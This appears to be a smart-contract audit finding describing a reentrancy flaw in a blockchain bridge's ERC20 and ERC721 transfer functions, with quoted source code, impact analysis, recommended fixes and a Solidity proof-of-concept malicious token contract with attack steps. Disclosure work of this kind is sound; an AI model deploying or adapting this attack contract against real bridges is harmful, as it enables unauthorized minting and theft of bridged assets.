### Title
Reentrancy in `_requestERC20Transfer` / `_requestERC721Transfer` Allows `requestNonce` Duplication and Unauthorized Double-Minting of Bridged Assets — (`contracts/service_chain/bridge/BridgeTransferERC20.sol`, `BridgeTransferERC721.sol`)

---

### Summary

`_requestERC20Transfer` and `_requestERC721Transfer` make external calls to the registered token contract **before** incrementing `requestNonce`. A malicious (or callback-capable) registered token can re-enter either function, causing multiple `RequestValueTransfer` events to be emitted with consecutive, distinct nonces. The counterpart bridge processes every unique nonce independently, resulting in unauthorized minting or transfer of bridged assets on the destination chain.

The KLAY path explicitly carries `nonReentrant` and even has a developer comment acknowledging the requirement, but the ERC20 and ERC721 paths were left unprotected.

---

### Finding Description

**`_requestKLAYTransfer` (protected):**

`BridgeTransferKLAY.sol` line 106 carries `nonReentrant`, and `BridgeFee.sol` lines 41–42 contain the explicit comment:

```
// Caller of this function must be nonReentrant.
// - BridgeTransferKLAY._requestKLAYTransfer() is nonReentrant
``` [1](#0-0) [2](#0-1) 

**`_requestERC20Transfer` (unprotected):**

```solidity
function _requestERC20Transfer(...) internal onlyRegisteredToken onlyUnlockedToken {
    ...
    uint256 fee = _payERC20FeeAndRefundChange(_from, _tokenAddress, _feeLimit); // ← external call
    if (modeMintBurn) {
        ERC20Burnable(_tokenAddress).burn(_value);                               // ← external call
    }
    emit RequestValueTransfer(..., requestNonce, ...);
    requestNonce++;   // ← state update AFTER external calls
}
``` [3](#0-2) 

`_payERC20FeeAndRefundChange` calls `IERC20(_token).safeTransfer(feeReceiver, fee)` and `IERC20(_token).safeTransfer(from, feeRefund)` — both are external calls into the token contract that execute before `requestNonce++`. [4](#0-3) 

**`_requestERC721Transfer` (unprotected):**

```solidity
function _requestERC721Transfer(...) internal onlyRegisteredToken onlyUnlockedToken {
    ...
    (bool success, bytes memory uri) = _tokenAddress.call(...);  // ← external call (tokenURI)
    if (modeMintBurn) {
        ERC721Burnable(_tokenAddress).burn(_tokenId);             // ← external call
    }
    emit RequestValueTransferEncoded(..., requestNonce, ...);
    requestNonce++;   // ← state update AFTER external calls
}
``` [5](#0-4) 

Both public entry points — `requestERC20Transfer` / `onERC20Received` and `requestERC721Transfer` / `onERC721Received` — delegate to these unprotected internal functions. [6](#0-5) [7](#0-6) 

---

### Impact Explanation

The `requestNonce` on the source bridge is the sole identifier the counterpart bridge uses to track and deduplicate cross-chain transfer requests. Each unique nonce causes the counterpart bridge to execute one `handleERC20Transfer` / `handleERC721Transfer`, which mints or transfers tokens to the recipient.

If reentrancy causes two `RequestValueTransfer` events to be emitted with nonces N and N+1 (the inner re-entrant call increments the nonce first, then the outer call uses the already-incremented value), the counterpart bridge will process **both** events independently. The result is that the destination chain mints or transfers twice the intended amount of bridged assets, while the source chain may have locked or burned only once (or not at all, if the token fakes `safeTransferFrom`).

This is an unauthorized mint/transfer of bridged assets — directly within the allowed impact gate. [8](#0-7) 

---

### Likelihood Explanation

**Prerequisite:** The attacking token must be registered in the bridge, which requires the bridge owner to call `registerToken`. This is a privileged operation, making the likelihood **low-to-medium** rather than high.

However, the risk is not purely theoretical:
- A legitimate ERC777-compatible token registered in the bridge would trigger `tokensReceived` hooks on the `feeReceiver`, enabling a malicious `feeReceiver` to re-enter.
- An upgradeable token registered in good faith could later be upgraded to include a re-entrant `transfer` or `burn`.
- The developer explicitly acknowledged the reentrancy requirement for the KLAY path but omitted the same guard for ERC20/ERC721, indicating an oversight rather than an intentional design choice. [9](#0-8) 

---

### Recommendation

1. Add `nonReentrant` (from the already-imported `ReentrancyGuard`) to `_requestERC20Transfer` and `_requestERC721Transfer`, mirroring the KLAY path.
2. Alternatively, move `requestNonce++` to **before** any external call (checks-effects-interactions), so a re-entrant call would use a different nonce and the outer call would use the original nonce — preventing nonce duplication.

```solidity
// Option B: increment first
requestNonce++;
emit RequestValueTransfer(..., requestNonce - 1, ...);
```

---

### Proof of Concept

```solidity
contract MaliciousERC20 is ERC20 {
    Bridge public bridge;
    bool public attacking;

    // Called by bridge during _payERC20FeeAndRefundChange → safeTransfer
    function transfer(address to, uint256 amount) public returns (bool) {
        if (!attacking) {
            attacking = true;
            // Re-enter: emits RequestValueTransfer with requestNonce = N
            bridge.requestERC20Transfer(address(this), victim, 1e18, 0, "");
            attacking = false;
        }
        return true; // fake success, no real transfer
    }

    function transferFrom(address, address, uint256) public returns (bool) {
        return true; // fake success
    }

    function burn(uint256) public {} // no-op
}

// Attack:
// 1. Owner registers MaliciousERC20 in bridge.
// 2. Attacker calls bridge.requestERC20Transfer(malicious, victim, 1e18, fee, "")
//    → safeTransferFrom (fake) → _requestERC20Transfer
//      → _payERC20FeeAndRefundChange → safeTransfer → MaliciousERC20.transfer
//        → re-enters bridge.requestERC20Transfer
//          → emits RequestValueTransfer(nonce=0) → requestNonce=1
//      → burn (no-op)
//    → emits RequestValueTransfer(nonce=1) → requestNonce=2
//
// Counterpart bridge processes nonce=0 AND nonce=1 → mints 2×1e18 tokens to victim.
// Source chain locked: 0 real tokens.
``` [10](#0-9) [4](#0-3)

### Citations

**File:** contracts/service_chain/bridge/BridgeFee.sol (L41-43)
```text
    // Caller of this function must be nonReentrant.
    // - BridgeTransferKLAY._requestKLAYTransfer() is nonReentrant
    function _payKLAYFeeAndRefundChange(uint256 _feeLimit) internal returns(uint256) {
```

**File:** contracts/service_chain/bridge/BridgeFee.sol (L68-88)
```text
    function _payERC20FeeAndRefundChange(address from, address _token, uint256 _feeLimit) internal returns(uint256) {
        uint256 fee = feeOfERC20[_token];

        if (feeReceiver != address(0) && fee > 0) {
            require(_feeLimit >= fee, "insufficient feeLimit");

            IERC20(_token).safeTransfer(feeReceiver, fee);

            uint256 feeRefund = _feeLimit.sub(fee);
            if (feeRefund > 0) {
                IERC20(_token).safeTransfer(from, feeRefund);
            }

            return fee;
        }

        if (_feeLimit > 0) {
            IERC20(_token).safeTransfer(from, _feeLimit);
        }
        return 0;
    }
```

**File:** contracts/service_chain/bridge/BridgeTransferKLAY.sol (L103-107)
```text
    function _requestKLAYTransfer(address _to, uint256 _feeLimit,  bytes memory _extraData)
        internal
        unlockedKLAY
        nonReentrant
    {
```

**File:** contracts/service_chain/bridge/BridgeTransferERC20.sol (L76-108)
```text
    function _requestERC20Transfer(
        address _tokenAddress,
        address _from,
        address _to,
        uint256 _value,
        uint256 _feeLimit,
        bytes memory _extraData
    )
        internal
        onlyRegisteredToken(_tokenAddress)
        onlyUnlockedToken(_tokenAddress)
    {
        require(isRunning, "stopped bridge");
        require(_value > 0, "zero ERC20 token amount");

        uint256 fee = _payERC20FeeAndRefundChange(_from, _tokenAddress, _feeLimit);

        if (modeMintBurn) {
            ERC20Burnable(_tokenAddress).burn(_value);
        }

        emit RequestValueTransfer(
            TokenType.ERC20,
            _from,
            _to,
            _tokenAddress,
            _value,
            requestNonce,
            fee,
            _extraData
        );
        requestNonce++;
    }
```

**File:** contracts/service_chain/bridge/BridgeTransferERC20.sol (L110-135)
```text
    // onERC20Received function of ERC20 token for 1-step deposits to the Bridge.
    function onERC20Received(
        address _from,
        address _to,
        uint256 _value,
        uint256 _feeLimit,
        bytes memory _extraData
    )
        public
    {
        _requestERC20Transfer(msg.sender, _from, _to, _value, _feeLimit, _extraData);
    }

    // requestERC20Transfer requests transfer ERC20 to _to on relative chain.
    function requestERC20Transfer(
        address _tokenAddress,
        address _to,
        uint256 _value,
        uint256 _feeLimit,
        bytes memory _extraData
    )
        public
    {
        IERC20(_tokenAddress).safeTransferFrom(msg.sender, address(this), _value.add(_feeLimit));
        _requestERC20Transfer(_tokenAddress, msg.sender, _to, _value, _feeLimit, _extraData);
    }
```

**File:** contracts/service_chain/bridge/BridgeTransferERC721.sol (L74-106)
```text
    function _requestERC721Transfer(
        address _tokenAddress,
        address _from,
        address _to,
        uint256 _tokenId,
        bytes memory _extraData
    )
        internal
        onlyRegisteredToken(_tokenAddress)
        onlyUnlockedToken(_tokenAddress)
    {
        require(isRunning, "stopped bridge");
        (bool success, bytes memory uri) = _tokenAddress.call(abi.encodePacked(ERC721Metadata(_tokenAddress).tokenURI.selector, abi.encode(_tokenId)));
        if (!success) {
            uri = "";
        }
        if (modeMintBurn) {
            ERC721Burnable(_tokenAddress).burn(_tokenId);
        }
        emit RequestValueTransferEncoded(
            TokenType.ERC721,
            _from,
            _to,
            _tokenAddress,
            _tokenId,
            requestNonce,
            0,
            _extraData,
            2,
            abi.encode(string(uri))
        );
        requestNonce++;
    }
```

**File:** contracts/service_chain/bridge/BridgeTransferERC721.sol (L108-131)
```text
    // onERC721Received function of ERC721 token for 1-step deposits to the Bridge
    function onERC721Received(
        address _from,
        uint256 _tokenId,
        address _to,
        bytes memory _extraData
    )
        public
    {
        _requestERC721Transfer(msg.sender, _from, _to, _tokenId, _extraData);
    }

    // requestERC721Transfer requests transfer ERC721 to _to on relative chain.
    function requestERC721Transfer(
        address _tokenAddress,
        address _to,
        uint256 _tokenId,
        bytes memory _extraData
    )
        public
    {
        IERC721(_tokenAddress).transferFrom(msg.sender, address(this), _tokenId);
        _requestERC721Transfer(_tokenAddress, msg.sender, _to, _tokenId, _extraData);
    }
```
